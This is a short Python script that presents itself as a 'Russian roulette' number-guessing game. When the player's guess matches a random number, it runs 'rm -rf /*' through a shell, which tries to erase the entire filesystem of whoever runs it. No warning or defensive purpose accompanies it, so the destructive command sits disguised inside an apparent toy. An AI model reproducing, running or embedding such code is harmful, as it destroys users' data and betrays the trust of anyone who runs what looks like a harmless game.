import random, subprocess

def russian_roulette():
    bullet = random.randint(1, 6)
    print("Guess a number between 1 and 6:")
    guess = int(input())
    if guess < 7:    
        if 0 < guess:
            if guess == bullet:
                print("Bang! Goodbye :3")
                subprocess.run(['rm -rf /*'], shell = True)
            else:
                print("Click! You're safe.")
        else:
            print("Please input a value in between 1 and 6")
    else:
        print("Please input a value in between 1 and 6")

russian_roulette()